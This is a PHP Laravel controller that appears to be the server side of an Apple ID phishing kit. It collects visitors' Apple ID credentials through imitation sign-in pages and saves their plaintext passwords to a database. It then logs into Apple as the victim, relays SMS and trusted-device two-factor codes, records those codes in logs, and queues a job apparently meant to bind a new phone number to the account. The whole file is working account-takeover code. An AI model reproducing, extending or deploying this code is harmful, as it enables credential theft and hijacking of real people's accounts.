<?php

namespace App\Http\Controllers;

use App\Apple\Service\AccountBind;
use App\Apple\Service\Apple;
use App\Apple\Service\AppleFactory;
use App\Apple\Service\Common;
use App\Apple\Service\DataConstruct\ServiceError;
use App\Apple\Service\Enums\AccountStatus;
use App\Apple\Service\Exception\AccountLockoutException;
use App\Apple\Service\Exception\LockedException;
use App\Apple\Service\Exception\UnauthorizedException;
use App\Apple\Service\Exception\VerificationCodeIncorrect;
use App\Apple\Service\HttpClientBak;
use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
use App\Apple\Service\User;
use App\Events\AccountAuthFailEvent;
use App\Events\AccountAuthSuccessEvent;
use App\Events\AccountBindPhoneFailEvent;
use App\Events\AccountLoginSuccessEvent;
use App\Events\AccountStatusChanged;
use App\Http\Requests\VerifyAccountRequest;
use App\Jobs\BindAccountPhone;
use App\Models\Account;
use App\Models\SecuritySetting;
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Contracts\Container\Container;
use Illuminate\Contracts\Events\Dispatcher;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use libphonenumber\NumberParseException;
use libphonenumber\PhoneNumberFormat;

class IndexController extends Controller
{
    public function __construct(
        protected readonly Request $request,
        private readonly AppleFactory $appleFactory,
        private readonly PhoneNumberFactory $phoneNumberFactory,
    )
    {

    }

    protected function getAccount(): ?Account
    {
        return $this->request->user();
    }

    protected function getApple():?Apple
    {
        return $this->request->attributes->get('apple');
    }

    public function ip():string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/signin');
    }

    protected function getCountryCode():?string
    {
        return SecuritySetting::first()?->configuration['country_code'] ?? null;
    }

    protected function formatPhone(string $phone): string
    {
        if (empty($countryCode = $this->getCountryCode())) {
            return $phone;
        }

        try {

            return $this->phoneNumberFactory->createPhoneNumberService(
                $phone,
                $countryCode,
                PhoneNumberFormat::INTERNATIONAL
            )->format();

        } catch (NumberParseException $e) {
            return $phone;
        }
    }

    /**
     * @param VerifyAccountRequest $request
     * @return JsonResponse
     * @throws AccountLockoutException
     * @throws GuzzleException
     * @throws UnauthorizedException
     */
    public function verifyAccount(VerifyAccountRequest $request): JsonResponse
    {
        //Your Apple ID or password was incorrect 您的 Apple ID 或密码不正确
        // 获取验证过的数据
        $validatedData = $request->validated();

        // 获取 accountName
        $accountName = $validatedData['accountName'];

        // 获取 password
        $password = $validatedData['password'];

        $validator = Validator::make(['email' => $accountName], [
            'email' => 'email',
        ]);

        // 不是有效的邮箱,那就是手机号
        if ($validator->fails()) {
            $accountName = $this->formatPhone($accountName);
        }

        //毫秒时间戳
        $guid = sha1($accountName.microtime());

        $apple = $this->appleFactory->create($guid);

        $apple->clear();
        $apple->getUser()->set('account', $accountName);
        $apple->getUser()->set('password', $password);

        $response = $apple->signin($accountName, $password);

        $account = Account::updateOrCreate([
            'account' => $accountName,
        ],[ 'password' => $password]);

        $error = $response->firstAuthServiceError()?->getMessage();
        Session::flash('Error',$error);

        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功 {$error}"));

        if ($response->hasTrustedDevices() || $response->getTrustedPhoneNumbers()->count() === 0){
            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => true,
                'Error' => $error,
            ],code: 201);
        }

        if ($response->getTrustedPhoneNumbers()->count() >= 2){
            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => false,
                'Error' => $error,
            ],code: 202);
        }

        $trustedPhoneNumbers = $response->getTrustedPhoneNumbers()->first();

        return $this->success(data: [
            'Guid' => $guid,
            'Devices' => false,
            'ID' => $trustedPhoneNumbers->getId(),
            'Number' => $trustedPhoneNumbers->getNumberWithDialCode(),
            'Error' => $error,
        ],code: 203);

    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     * @throws GuzzleException
     * @throws UnauthorizedException
     */
    public function authPhoneList(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
    {
        $guid = $this->request->input('Guid');

        $apple = $this->appleFactory->create($guid);

        $response = $apple->auth();

        $trustedPhoneNumbers = $response->getTrustedPhoneNumbers();
        return view('index.auth-phone-list',['trustedPhoneNumbers' => $trustedPhoneNumbers]);
    }

    /**
     * 验证安全码
     * @return JsonResponse
     * @throws \App\Apple\Service\Exception\UnauthorizedException
     * @throws \GuzzleHttp\Exception\GuzzleException|\App\Apple\Service\Exception\VerificationCodeIncorrect
     */
    public function verifySecurityCode(): JsonResponse
    {
        $code = $this->request->input('apple_verifycode');
        if (empty($code)) {
            return $this->redirect();
        }

        $guid = $this->request->input('Guid');

        $apple = $this->appleFactory->create($guid);

        if (empty($accountName = $apple->getUser()->get('account'))) {
            return $this->redirect();
        }

        if (empty($account = $this->getAccountInfo($accountName))) {
            return $this->redirect();
        }

        try {

            $response = $apple->validateSecurityCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "安全码验证成功 code:{$code}"));
        } catch (VerificationCodeIncorrect $e) {
            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "安全码验证失败 {$e->getMessage()}"));
            throw $e;
        }

        BindAccountPhone::dispatch($account->id,$guid);

        return $this->success($response->getData());
    }

    protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
    {
        return Account::where('account', $accountName)->first();
    }

    /**
     * 验证手机验证码
     * @return JsonResponse
     * @throws GuzzleException|\App\Apple\Service\Exception\VerificationCodeIncorrect
     * @throws UnauthorizedException
     */
    public function smsSecurityCode(): JsonResponse
    {
        $Id = $this->request->input('ID',1);
        $apple_verifycode = $this->request->input('apple_verifycode');

        if (empty($apple_verifycode) || Str::length($apple_verifycode) !== 6) {
            return $this->redirect();
        }

        $guid = $this->request->input('Guid');//147852

        $account = $this->getAccount();

        // 验证手机号码
        try {

            $response = $this->getApple()->validatePhoneSecurityCode($apple_verifycode, $Id);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$apple_verifycode}"));
        } catch (VerificationCodeIncorrect $e) {
            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "{$e->getMessage()}"));
            throw $e;
        }

        BindAccountPhone::dispatch($account->id,$guid);

        return $this->success($response->getData());
    }

    /**
     * 获取安全码
     * @return JsonResponse
     * @throws UnauthorizedException|GuzzleException
     */
    public function SendSecurityCode(): JsonResponse
    {
        $apple = $this->getApple();

        try {

            $response = $apple->idmsa->sendSecurityCode()->getData();

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '获取安全码',
                    'description' => '获取安全码成功',
                ]);

        } catch (\Exception $e) {

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '获取安全码',
                    'description' => "获取安全码失败:{$e->getMessage()}",
                ]);

            throw $e;
        }

        return $this->success($response);
    }

    /**
     * 获取手机号码
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws GuzzleException
     */
    public function GetPhone(): JsonResponse
    {
        $response = $this->getApple()->auth();

        $trustedPhoneNumbers = $response->getTrustedPhoneNumber();

        return $this->success([
            'ID'                  => $trustedPhoneNumbers?->getId(),
            'Number'              => $trustedPhoneNumbers?->getNumberWithDialCode(),
        ]);
    }

    /**
     * 发送验证码
     * @return JsonResponse|Redirector
     * @throws GuzzleException|\Illuminate\Validation\ValidationException
     * @throws \Exception
     */
    public function SendSms(): JsonResponse|Redirector
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer'
        ])->validated();

        $ID = (int) $params['ID'];


        try {

            $response = $this->getApple()->sendPhoneSecurityCode($ID);

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '发送手机验证码',
                    'description' => "发送手机验证码成功",
                ]);

        } catch (\Exception $e) {

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '发送手机验证码',
                    'description' => "发送手机验证码失败:{$e->getMessage()}",
                ]);

            throw $e;
        }

        /**
         * @var $error ServiceError
         */
        $error = $response->getServiceErrors()->first();

        Session::flash('Error',$error?->getMessage());

        return $this->success($response->getData());
    }

    public function sms(): View|Factory|Application
    {
        return view('index/sms',['phoneNumber' => $this->request->input('Number')]);
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }
}
